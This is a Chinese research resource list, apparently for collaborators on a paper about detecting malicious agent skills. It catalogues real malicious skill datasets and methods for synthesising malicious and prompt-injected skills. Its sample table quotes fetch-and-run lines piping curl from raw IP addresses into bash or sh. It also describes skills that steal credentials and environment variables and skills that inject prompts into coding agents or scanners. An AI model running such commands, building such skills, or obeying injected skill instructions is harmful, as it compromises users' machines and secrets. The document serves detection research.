# 恶意 Skill 资源清单（供协作者共享）

> 整理日期：2026-08-06 | 所有链接已验证可用
> 分两部分：① 真实恶意 skill ② 构建/构造方法

---

## 第一部分：真实恶意 Skills（公开仓库/数据集）

这些是**真实世界暴露/确认的恶意 skill**，不是人造的。可用于论文的恶意锚集。

---

### 1. MalSkillBench Wild（703 个，主力锚）

- **仓库**：https://github.com/lxyeternal/MalSkillBench
- **论文**：arXiv:2606.07131
- **路径**：`Dataset/Skills/malware/<skill-name>/SKILL.md`（无 `__CI_`/`__PI_`/`__MIXED_` 后缀的就是 wild）
- **来源**：公开注册表收集（ClawHub），81% 来自 ClawHavoc 战役两个真实账户（hightower6eu + sakaen736jih）
- **验证方式**：人工确认恶意
- **行为分布**：B4 恶意载荷投递 86.6%，其余 B1-B15 零散分布
- **与我们关系**：零重叠（作者集合不相交）
- **注意**：仓库 1.48GB，建议用 raw URL 逐个取（`https://raw.githubusercontent.com/lxyeternal/MalSkillBench/main/Dataset/Skills/malware/<name>/SKILL.md`）
- **代码级验证（我们已做）**：拉取 6 个样本，全部含真实恶意载荷

**代表性样本**：
| skill 名 | 伪装 | 恶意行为 |
|---|---|---|
| agent-browser-6aigix9qi2tu | 浏览器工具 | `base64 -D\|bash` → `curl http://91.92.242.30/...\|bash` |
| better-polymarket | 预测市场查询 | 藏了 `os.system("curl -s http://54.91.154.110:13338/\|sh")` |
| clawhub-aces1up-apify-keys | API key 管理器 | 硬编码 MySQL 密码偷 API key |
| clawhub-doctor-1017-aicash-miner | 加密货币工具 | 挖矿 + systemd 持久化 |

---

### 2. PiedPiper0709 恶意 Skill 目录（352 条）

- **仓库**：https://github.com/PiedPiper0709/openclaw-malicious-skills
- **数据**：`data/openclaw-risky-skills.csv`（352 条结构化记录）
- **来源**：基于公开安全研究、报告、issue、情报线索整理
- **内容**：每条含基础分类 + 风险说明
- **覆盖**：供应链风险 / 提示注入 / 数据窃取 / 远程执行

---

### 3. Trail of Bits 公开恶意 Skills（4 个）

- **仓库**：https://github.com/trailofbits/overtly-malicious-skills
- **博客**：https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/
- **用途**：Trail of Bits 的 ML 安全团队造来测试扫描器可靠性的
- **特征**：每个都有明确伪装 + 真实恶意行为

| skill | 声称做什么 | 实际做什么 |
|---|---|---|
| csv-summarizer | 汇总 CSV 维度 | 偷环境变量 |
| context-loader | 同步启动上下文 | .docx 里藏恶意脚本 |
| simple-formatter | 文本格式化 | Python 字节码投毒偷环境变量 |
| dev-env-setup | 开发环境配置 | prompt injection 骗扫描器 + 劫持 npm registry |

---

### 4. 其他真实恶意 skill 来源（部分可用）

| 来源 | 数量 | 可用性 | 说明 |
|---|---|---|---|
| MalSkillBench Test split | 27 | ✅ | 检测工具自带的确认恶意样本 |
| Snyk ToxicSkills | 76 | ⚠️ 名单不公开 | 报告只列 8 个 IOC；76 全名单省略 |
| ClawHavoc 战役 | 1184 | ⚠️ 可复得性待验 | Antiy CERT 文档记录的攻击战役 |
| MalSkills git 恢复 | 100 | ⚠️ 依赖历史快照 | 从 ClawHub commit 恢复，归档库可能 404 |
| Semia 专家标注 | 541 | ⚠️ 标签是"risk"非"malware" | 两作者独立标注 κ=0.83 |
| Locate-and-Judge | 131+82 | ❌ 数据集声称发布但无落点 | 121 争议样本被排除 |

---

## 第二部分：Skills 构建方法（论文 + 开源仓库）

这些是**手动或自动构造恶意 skill 的方法**。可用于 S5 评测需要自构造样本时参考。

---

### 方法 1：MalSkillBench（全自动 LLM 合成 + 沙箱验证）

- **论文**：arXiv:2606.07131
- **仓库**：https://github.com/lxyeternal/MalSkillBench
- **自动化**：全自动（LLM 写 skill + Docker 验证）
- **开源内容**：
  - `Core/generation/agent.py` — 生成主循环
  - `Core/generation/generator.py` — LLM 合成
  - `Core/generation/retriever.py` — 知识检索
  - `Core/verification/sandbox.py` — Docker 沙箱
  - `Core/verification/verifier.py` — 两层验证
  - `Core/taxonomy/` — 108 格 taxonomy 定义
- **seed**：3 向量（CI/PI/MIXED）× 15 行为（B1-B15）× 插入策略 = 108 格
- **规模**：3,214 generated（验证率 85.6%）
- **知识库**：CI 用 IntelliGraph（3026 恶意 PyPI 包）/ PI 用 WildJailbreak 等（20961 条注入语料）
- **良性壳池**：3458 个 SkillsMP 良性 skill

**生成流程**：
```
taxonomy 格 → 检索真实攻击模式 → 取良性 skill 壳 → LLM 合成 → Docker 沙箱验证 → 通过/反馈重试
```

**用我们 taxonomy 复用**：替换 `Core/taxonomy/` 里的定义即可，其他组件不变

---

### 方法 2：SkillInject（半自动，注入向量分类）

- **论文**：arXiv:2602.20156
- **仓库**：https://github.com/aisa-group/skill-inject
- **自动化**：半自动（手动设计注入模板 + Docker 跑 agent 测试）
- **seed**：4 轴分类
  - (a) 注入明显性：obvious vs contextual（dual-use 指令的危害取决于上下文）
  - (b) 注入通道：body / script / YAML description
  - (c) 攻击者能力分级：3 档
  - (d) 攻击目的：8 大类（数据外泄/凭证窃取/RCE/勒索/DDoS/后门/偏见操纵/投毒）
- **规模**：202 injection-task pairs（41 contextual + 30 obvious + 44 skill 定义 × 3 策略条件）
- **测试对象**：Claude Code / Codex / Gemini CLI（Docker 隔离跑）
- **特点**：contextual injection 是核心贡献——dual-use 指令在正常上下文无害、在特定上下文有害

---

### 方法 3：SkillTrustBench（全自动注入矩阵）

- **来源**：腾讯朱雀实验室 × CUHK-SZ
- **官网**：https://matrix.tencent.com/skilltrustbench/
- **HF dataset**：https://huggingface.co/datasets/cuhk-zhuque/SkillTrustBench
- **自动化**：全自动
- **seed**：9 攻击类别（T01-T09）× 5 依赖层（A-E）= 45 格
- **规模**：5,520（95.6% 合成 + 242 wild + 4 benign pool）
- **标签**：三值（malicious / suspicious / normal）
- **开源**：⚠️ 数据集 + leaderboard 开源，**生成代码不开源**

---

### 方法 4：Promptfoo（手动红队插件）

- **仓库**：https://github.com/promptfoo/promptfoo
- **自动化**：手动（人工写 86 个对抗 prompt 插件）
- **seed**：5 风险领域（安全/隐私/刑事/有害/虚假信息）× 86 插件
- **特点**：通用红队工具，非 taxonomy 驱动（按危害主题组织）
- **Coding Agent 子插件**（13 个）最贴合 agent skill 攻击面（沙箱逃逸/CI 投毒/验证器破坏/隐写外泄）

---

### 方法 5：SkillSafetyBench（半自动场景构造）

- **论文**：arXiv:2605.12015
- **仓库**：https://github.com/AI45Lab/skill-safety-bench
- **网站**：https://jinchang1223.github.io/skill-safety-bench-website/
- **自动化**：半自动（手动构造场景 + deterministic verifier）
- **seed**：6 风险域 × 30 安全类别
- **规模**：155 对抗用例 / 47 任务
- **特点**：测 **agent** 安全性（非 skill 检测），攻击藏在 skill/local script/corpus 里，用户任务是良性的

---

### 方法 6：MalSkills git commit 恢复（自动，非构造）

- **论文**：arXiv:2603.27204
- **方法**：从公开恶意事件 → ClawHub git 历史 → 恢复已删除恶意 skill → 哈希去重
- **规模**：100 确认恶意
- **特点**：恢复真实恶意 skill（非构造），但依赖历史快照，归档库可能 404

---

## 快速参考表

### 真实恶意 skill（去看内容）

| # | 名称 | 数量 | 链接 | 值得看什么 |
|---|---|---|---|---|
| 1 | MalSkillBench Wild | 703 | github.com/lxyeternal/MalSkillBench | 真实恶意，主力锚 |
| 2 | PiedPiper0709 目录 | 352 | github.com/PiedPiper0709/openclaw-malicious-skills | 结构化清单，覆盖全 |
| 3 | Trail of Bits | 4 | github.com/trailofbits/overtly-malicious-skills | 精心设计的 4 个伪装样本 |
| 4 | MalSkillBench Test | 27 | 同 #1 | 检测工具自带样本 |

### 构建方法（去看怎么造）

| # | 名称 | 自动化 | 链接 | 值得看什么 |
|---|---|---|---|---|
| 1 | MalSkillBench | 全自动 | github.com/lxyeternal/MalSkillBench | **最值得看**——`Core/generation/` 全开源，可复用 |
| 2 | SkillInject | 半自动 | github.com/aisa-group/skill-inject | contextual injection 设计思路 |
| 3 | SkillTrustBench | 全自动 | HF: cuhk-zhuque/SkillTrustBench | 数据集可用，代码不开源 |
| 4 | Promptfoo | 手动 | github.com/promptfoo/promptfoo | Coding Agent 13 子插件 |
| 5 | SkillSafetyBench | 半自动 | github.com/AI45Lab/skill-safety-bench | 场景 + verifier 设计 |
